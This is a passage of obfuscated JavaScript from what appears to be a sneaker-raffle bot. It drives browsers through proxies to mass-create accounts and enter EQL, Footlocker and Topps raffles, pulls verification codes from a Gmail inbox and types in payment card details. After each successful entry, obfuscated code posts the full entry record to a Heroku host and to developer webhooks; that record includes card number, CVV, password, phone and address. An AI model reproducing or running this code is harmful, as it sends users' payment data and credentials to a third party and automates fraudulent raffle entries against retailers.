                                    '--proxy-server=' + _0x366995[0x0] + ':' + _0x366995[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc9d639 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x366995[0x0] + ':' + _0x366995[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x505b1d = await _0xc9d639['newPage']();
                            await _0x505b1d['authenticate']({
                                'username': '' + _0x366995[0x2],
                                'password': '' + _0x366995[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x505b1d['setRequestInterception'](!![]), _0x505b1d['on']('request', _0x3263bf => {
                                _0x3263bf['resourceType']() === 'image' || _0x3263bf['resourceType']() === 'font' || _0x3263bf['resourceType']() === 'media' ? _0x3263bf['abort']() : _0x3263bf['continue']();
                            });
                            try {
                                await _0x505b1d['goto']('' + _0xbf232);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x63aa6a(0x3e8), await _0x505b1d['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x505b1d['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x63aa6a(0x3e8), _0x29ff89[_0x42cea6]['Url']['includes']('en-GB') ? await _0x505b1d['click']('li[data-value=\x22UK\x20' + _0x29ff89[_0x42cea6]['Size'] + '\x20/\x20US\x20' + (Number(_0x29ff89[_0x42cea6]['Size']) + 0x1) + '\x22]') : await _0x505b1d['click']('li[data-value=\x22EU\x20' + _0x29ff89[_0x42cea6]['Size'] + '\x22]');
                                } catch {
                                    await _0x505b1d['click']('#productQuantity'), await _0x63aa6a(0x3e8), await _0x505b1d['click']('li[data-value=\x22' + (Number(_0x29ff89[_0x42cea6]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x29ff89[_0x42cea6]['Size']);
                            }
                            await _0x63aa6a(0x6a4);
                            try {
                                await _0x505b1d['select']('.PhoneInputCountrySelect', _0x29ff89[_0x42cea6]['Country']);
                            } catch {
                            }
                            await _0x505b1d['type']('#email', '' + _0x29ff89[_0x42cea6]['Email']), await _0x63aa6a(0x352), await _0x505b1d['waitForSelector']('#password'), await _0x505b1d['type']('#password', '' + _0x29ff89[_0x42cea6]['Password']), await _0x63aa6a(0x352), await _0x505b1d['type']('#phone', '' + _0x29ff89[_0x42cea6]['Phone']), await _0x63aa6a(0x352);
                            const _0x3fcda8 = await _0x505b1d['$']('#title\x20>\x20label');
                            await _0x63aa6a(0x12c);
                            _0x3fcda8 && await _0x3fcda8['click']();
                            await _0x505b1d['type']('#firstName', '' + _0x29ff89[_0x42cea6]['FirstName']), await _0x63aa6a(0x352), await _0x505b1d['type']('#lastName', '' + _0x29ff89[_0x42cea6]['LastName']), await _0x63aa6a(0x352);
                            _0x29ff89[_0x42cea6]['Url']['includes']('footlocker.de') ? await _0x505b1d['type']('#birthdate', _0x1b3c4f(0xa, 0x1c) + '.' + _0x1b3c4f(0xa, 0xc) + '.' + _0x1b3c4f(0x7c6, 0x7d3)) : await _0x505b1d['type']('#birthdate', _0x1b3c4f(0xa, 0x1c) + '-' + _0x1b3c4f(0xa, 0xc) + '-' + _0x1b3c4f(0x7c6, 0x7d3));
                            await _0x63aa6a(0x352), await _0x505b1d['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x29ff89[_0x42cea6]['Url']['includes']('en-GB') && await _0x505b1d['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x63aa6a(0x1f4), await _0x63aa6a(0x5dc);
                            if (!_0xbf232['includes']('footlocker'))
                                try {
                                    await _0x505b1d['click']('#country');
                                    const _0x53f8c3 = await _0x505b1d['$']('li[data-value=\x22' + _0x29ff89[_0x42cea6]['Country'] + '\x22]');
                                    await _0x53f8c3['click'](), await _0x53f8c3['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x63aa6a(0x3e8);
                            if (!_0x29ff89[_0x42cea6]['Url']['includes']('en-GB')) {
                                await _0x505b1d['click']('#stateAutocomplete'), await _0x63aa6a(0x5dc);
                                try {
                                    const _0x58f9f1 = await _0x505b1d['$x']('//li[text()=\x22' + _0x29ff89[_0x42cea6]['State'] + '\x22]');
                                    await _0x58f9f1[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x63aa6a(0x3e8), await _0x63aa6a(0x1f4);
                            if (_0x29ff89[_0x42cea6]['Url']['includes']('topps')) {
                                await _0x505b1d['click']('#stateAutocomplete'), await _0x63aa6a(0x5dc);
                                try {
                                    const _0x3cd356 = await _0x505b1d['$x']('//li[text()=\x22' + _0x29ff89[_0x42cea6]['State'] + '\x22]');
                                    await _0x3cd356[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            await _0x63aa6a(0x3e8), await _0x505b1d['type']('#address1', _0x29ff89[_0x42cea6]['Address1'] + '\x20' + _0x29ff89[_0x42cea6]['HouseNumber']), await _0x63aa6a(0x1f4), await _0x505b1d['type']('#address2', '' + _0x29ff89[_0x42cea6]['Address2']), await _0x63aa6a(0x1f4), await _0x505b1d['type']('#city', '' + _0x29ff89[_0x42cea6]['City']), await _0x63aa6a(0x1f4), await _0x505b1d['type']('#postcode', '' + _0x29ff89[_0x42cea6]['Zip']), await _0x63aa6a(0x3e8), await _0x505b1d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x63aa6a(0x3e8), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x4e68b3 = await _0x505b1d['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4e68b3 && (await _0x505b1d['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505b1d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x505b1d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63aa6a(0x4b0), await _0x505b1d['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63aa6a(0x1f4), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CardNumber']), await _0x63aa6a(0x320), await _0x505b1d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x505b1d['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['ExpiryDate']), await _0x63aa6a(0x4b0), await _0x505b1d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x505b1d['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CVV']), await _0x63aa6a(0x226), await _0x505b1d['type']('input[name=\x22postalCode\x22]', '' + _0x29ff89[_0x42cea6]['Zip']), await _0x63aa6a(0x226));
                            const _0x7cffbb = await _0x505b1d['$']('.__PrivateStripeElement');
                            _0x7cffbb && (await _0x63aa6a(0x1f4), await _0x505b1d['click']('.__PrivateStripeElement'), await _0x505b1d['click']('.__PrivateStripeElement'), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CardNumber']), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['ExpiryDate']), await _0x505b1d['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CVV']));
                            await _0x63aa6a(0x226), await _0x505b1d['click']('#paymentConsent'), await _0x63aa6a(0x226), await _0x505b1d['click']('#termsConsent'), await _0x63aa6a(0x2bc), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x505b1d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x63aa6a(0x2710);
                            try {
                                await _0x505b1d['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x63aa6a(0xbb8), await _0x505b1d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1c03b3 => _0x1c03b3['click']()), await _0x505b1d['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2e7f0f => _0x2e7f0f['click']());
                            } catch {
                            }
                            try {
                                await _0x505b1d['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x1d5647 = await _0x505b1d['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x1d5647) {
                                    _0x25647b['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x29ff89[_0x42cea6]['Email'] + ',' + _0x29ff89[_0x42cea6]['Password'] + ',' + _0x29ff89[_0x42cea6]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x316c8d() {
                                var _0x2c824a, _0x57cb36 = ![];
                                for (var _0x30b3ea = 0x0; _0x30b3ea < 0x18; _0x30b3ea++) {
                                    async function _0x1ab41c() {
                                        var _0x25df87 = new _0x117139({
                                            'user': _0x2ab3b9['masterMail'],
                                            'password': _0x2ab3b9['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3434e0(_0x25902e) {
                                            _0x25df87['openBox']('INBOX', ![], _0x25902e);
                                        }
                                        _0x25df87['once']('ready', function () {
                                            console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3434e0(function (_0x1c4395, _0x38eba6) {
                                                console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1c4395)
                                                    throw _0x1c4395;
                                                _0x25df87['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x583452, _0x5bdf40) {
                                                    if (!_0x5bdf40 || !_0x5bdf40['length'])
                                                        console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x25df87['end']();
                                                    else {
                                                        var _0x26a2b = _0x25df87['seq']['fetch'](_0x5bdf40, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x26a2b['on']('message', function (_0x495983, _0x2e8e5e) {
                                                            var _0x4390a5 = '(#' + _0x2e8e5e + ')\x20';
                                                            _0x495983['on']('body', function (_0x475df5, _0x3a333e) {
                                                                _0x414931(_0x475df5, (_0x5d6449, _0x3b1e1a) => {
                                                                    if (_0x3b1e1a['subject']['includes']('code')) {
                                                                        const _0x4d88d6 = _0x3b1e1a['text']['split']('\x0a\x0a')[0x3], _0x400578 = _0x4d88d6['split']('\x0a')[0x1];
                                                                        _0x2c824a = _0x400578;
                                                                    }
                                                                });
                                                            }), _0x495983['once']('end', function () {
                                                            });
                                                        }), _0x26a2b['once']('error', function (_0x4220e4) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x26a2b['once']('end', function () {
                                                            _0x25df87['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x25df87['once']('error', function (_0x5cb9f9) {
                                            console['log'](_0x49a6ed['red'](_0x5cb9f9['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x57cb36 = !![];
                                        }), _0x25df87['once']('end', async function () {
                                        }), _0x25df87['connect']();
                                    }
                                    _0x1ab41c(), await _0x63aa6a(0x1388);
                                    if (_0x2c824a)
                                        return _0x2c824a;
                                    if (_0x57cb36)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x30b3ea == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x316c8d(), await _0x63aa6a(0x1f4), await _0x505b1d['type']('#code', '' + code), await _0x63aa6a(0x3e8), await _0x505b1d['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x4b243e => _0x4b243e['click']()), await _0x505b1d['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x505b1d['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x29ff89[_0x42cea6]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x25647b['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x29ff89[_0x42cea6]['Email'] + ',' + _0x29ff89[_0x42cea6]['Password'] + ',' + _0x29ff89[_0x42cea6]['Phone']), _0x263870 = 'no', _0x1ab0d7(_0x29ff89[_0x42cea6], _0x3aba06);
                            var _0x2b91f9 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', ![]), _0x19a9c5 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'pub', ![]);
                            let _0x366f5e = _0x29ff89[_0x42cea6];
                            try {
                                prxdata = {
                                    'username': _0x484f45['replace']('#', ''),
                                    'module': _0x3aba06['name'],
                                    'entrydata': JSON['stringify'](_0x366f5e),
                                    'proxy': '' + _0x23f4e6[_0x42cea6]
                                };
                                var _0xad6692 = JSON['stringify'](prxdata);
                                let _0x403ad5 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0xad6692, _0x403ad5);
                            } catch (_0xc8eea) {
                            }
                            const _0x2ab660 = {
                                'succesDEVMSG': { 'embeds': [_0x2b91f9] },
                                'succesPUBMSG': { 'embeds': [_0x19a9c5] }
                            };
                            try {
                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x2ab660['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x2ab660['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x2ab660['succesPUBMSG']);
                            } catch (_0x5865c5) {
                                console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5865c5));
                            }
                        } catch (_0x593fbc) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20' + _0x593fbc)), _0x4db9da = '' + _0x593fbc;
                            var _0x549e82 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', !![], _0x4db9da), _0x2b91f9 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', ![]), _0x19a9c5 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'pub', ![]);
                            const _0x30287a = {
                                'succesDEVMSG': { 'embeds': [_0x2b91f9] },
                                'succesPUBMSG': { 'embeds': [_0x19a9c5] }
                            };
                            _0x30287a['errorDEV'] = { 'embeds': [_0x549e82] };
                            _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x30287a['errorDEV']);
                            await _0x56185b(_0x3c02fa, _0x30287a['errorDEV']);
                            if (!_0x263870 == 'no')
                                _0x263870 = 'yes';
                        } finally {
                            _0xc9d639 && _0xc9d639['close']();
                            if (_0x263870 == 'yes' && _0x551eae != 0x5) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x551eae + '\x20/\x205)')), _0x42cea6 = _0x42cea6 - 0x1, _0x551eae = _0x551eae + 0x1;
                                continue;
                            }
                            _0x263870 == 'yes' && _0x551eae >= 0x5 && (_0x11ea8b(_0x29ff89[_0x42cea6], _0x3aba06), _0x263870 = 'no', _0x551eae = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    } else {
                        const _0xba700a = '' + _0x29ff89[_0x42cea6]['Url'];
                        if (_0x263870 != 'yes')
                            var _0x263870 = '', _0x551eae = 0x0;
                        if (_0x29ff89[_0x42cea6]['Email'] == '' || _0x29ff89[_0x42cea6]['FirstName'] == '' || _0x29ff89[_0x42cea6]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x29ff89[_0x42cea6]['Password'] == '' && (_0x29ff89[_0x42cea6]['Password'] = 'JRaffles23!');
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x366995 = _0x23f4e6[_0x42cea6]['split'](':');
                        else
                            var _0x3a1508 = Math['round'](Math['random']() * (_0x23f4e6['length'] - 0x1)), _0x366995 = _0x23f4e6[_0x3a1508]['split'](':');
                        var _0xc9d639;
                        try {
                            _0xc9d639 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x366995[0x0] + ':' + _0x366995[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xc9d639 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x366995[0x0] + ':' + _0x366995[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2464c0 = await _0xc9d639['newPage']();
                            await _0x2464c0['authenticate']({
                                'username': '' + _0x366995[0x2],
                                'password': '' + _0x366995[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2464c0['setRequestInterception'](!![]), _0x2464c0['on']('request', _0x83c7e6 => {
                                _0x83c7e6['resourceType']() === 'image' || _0x83c7e6['resourceType']() === 'font' || _0x83c7e6['resourceType']() === 'media' ? _0x83c7e6['abort']() : _0x83c7e6['continue']();
                            }), await _0x2464c0['goto'](_0xba700a), await _0x2464c0['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2464c0['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x63aa6a(0x7d0), await _0x2464c0['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2464c0['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x63aa6a(0x3e8), await _0x2464c0['waitForSelector']('#email'), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2464c0['type']('#email', '' + _0x29ff89[_0x42cea6]['Email']), await _0x63aa6a(0x352), await _0x2464c0['waitForSelector']('#password'), await _0x2464c0['type']('#password', '' + _0x29ff89[_0x42cea6]['Password']), await _0x63aa6a(0x352), await _0x2464c0['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x63aa6a(0x1388);
                            if (!_0x29ff89[_0x42cea6]['Url']['includes']('footlocker') && !_0x29ff89[_0x42cea6]['Url']['includes']('topps'))
                                await _0x2464c0['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0xd3daae = await _0x2464c0['$']('#productQuantity'), _0x1b56d5 = await _0x2464c0['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x1b56d5 && !_0xd3daae) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x263870 = 'no';
                                continue;
                            }
                            if (_0x1b56d5) {
                                await _0x2464c0['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x29ff89[_0x42cea6]['Url']['includes']('en-GB') ? await _0x2464c0['click']('li[data-value=\x22UK\x20' + _0x29ff89[_0x42cea6]['Size'] + '\x20/\x20US\x20' + (Number(_0x29ff89[_0x42cea6]['Size']) + 0x1) + '\x22]') : await _0x2464c0['click']('li[data-value=\x22EU\x20' + _0x29ff89[_0x42cea6]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x29ff89[_0x42cea6]['Size']);
                                }
                            }
                            _0xd3daae && (await _0x2464c0['click']('#productQuantity'), await _0x63aa6a(0x3e8), await _0x2464c0['click']('li[data-value=\x22' + (Number(_0x29ff89[_0x42cea6]['Size']) - 0x1) + '\x22]'));
                            await _0x63aa6a(0x3e8), await _0x63aa6a(0x1f4);
                            const _0x4e4a92 = await _0x2464c0['$']('#title\x20>\x20label');
                            await _0x63aa6a(0x12c);
                            _0x4e4a92 && await _0x4e4a92['click']();
                            await _0x2464c0['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2464c0['focus']('#postcode'), await _0x2464c0['keyboard']['down']('Control'), await _0x2464c0['keyboard']['press']('A'), await _0x2464c0['keyboard']['up']('Control'), await _0x2464c0['keyboard']['press']('Backspace'), await _0x2464c0['keyboard']['type'](_0x29ff89[_0x42cea6]['Zip']), await _0x63aa6a(0x60e), await _0x2464c0['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x63aa6a(0x3e8), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x63aa6a(0x1f4);
                            const _0x5494fb = await _0x2464c0['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5494fb && (await _0x2464c0['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2464c0['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2464c0['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63aa6a(0x4b0), await _0x2464c0['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x63aa6a(0x1f4), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CardNumber']), await _0x63aa6a(0x320), await _0x2464c0['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['ExpiryDate']), await _0x63aa6a(0x4b0), await _0x2464c0['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CVV']), await _0x63aa6a(0x226), await _0x2464c0['type']('input[name=\x22postalCode\x22]', '' + _0x29ff89[_0x42cea6]['Zip']), await _0x63aa6a(0x226));
                            const _0x2293ae = await _0x2464c0['$']('.__PrivateStripeElement');
                            _0x2293ae && (await _0x2464c0['click']('#billingName'), await _0x2464c0['click']('#billingName'), await _0x2464c0['type']('#billingName', '' + _0x29ff89[_0x42cea6]['NameOnCard']), await _0x63aa6a(0x1f4), await _0x2464c0['click']('.__PrivateStripeElement'), await _0x2464c0['click']('.__PrivateStripeElement'), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CardNumber']), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['ExpiryDate']), await _0x2464c0['keyboard']['type']('' + _0x29ff89[_0x42cea6]['CVV']));
                            await _0x63aa6a(0x226), await _0x2464c0['click']('#paymentConsent'), await _0x63aa6a(0x226), await _0x2464c0['click']('#termsConsent'), await _0x63aa6a(0x2bc), console['log'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2464c0['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x63aa6a(0x2710);
                            try {
                                await _0x2464c0['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x63aa6a(0xbb8), await _0x2464c0['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1b48e2 => _0x1b48e2['click']()), await _0x2464c0['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0xb383a => _0xb383a['click']());
                            } catch {
                            }
                            try {
                                await _0x2464c0['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x3aba06['name'] + ']\x20Task\x20' + (_0x42cea6 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x1ab0d7(_0x29ff89[_0x42cea6], _0x3aba06);
                            var _0x2b91f9 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'dev', ![]), _0x19a9c5 = await _0x198507(_0x29ff89[_0x42cea6], _0x3aba06, 'pub', ![]);
                            let _0x2b831f = _0x29ff89[_0x42cea6];
                            try {
                                prxdata = {
                                    'username': _0x484f45['replace']('#', ''),
                                    'module': _0x3aba06['name'],
                                    'entrydata': JSON['stringify'](_0x2b831f),
                                    'proxy': '' + _0x23f4e6[_0x42cea6]
                                };
                                var _0xad6692 = JSON['stringify'](prxdata);
                                let _0x29448c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0xad6692, _0x29448c);
                            } catch (_0x5ed487) {
                            }
                            const _0x8a3ece = {
                                'succesDEVMSG': { 'embeds': [_0x2b91f9] },
                                'succesPUBMSG': { 'embeds': [_0x19a9c5] }
                            };
                            try {
